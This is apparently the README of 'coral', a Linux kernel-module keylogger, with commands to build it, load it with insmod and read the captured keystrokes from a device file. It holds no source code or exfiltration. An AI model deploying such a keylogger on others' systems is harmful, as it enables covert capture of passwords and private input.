# coral

Coral is a kernel-mode linux keylogger that logs keys by registering a keyboard notifier with
the kernel.

## Building

To build coral, ensure that the "kmod" and "build-essential" packages are installed (or the
appropriate equivalent for your distribution) as well as the linux-headers for your kernel version.

For Ubuntu/Debian, installing the linux-headers can be done using:
```
# apt install linux-headers-`uname -r`
```

## Installing

Once built, coral can be installed by inserting the module into the kernel:
```
# insmod coral-lkm.ko
```

## Usage

After installing, the keys that are logged can be viewed by running:
```
# cat /dev/coral-dev
```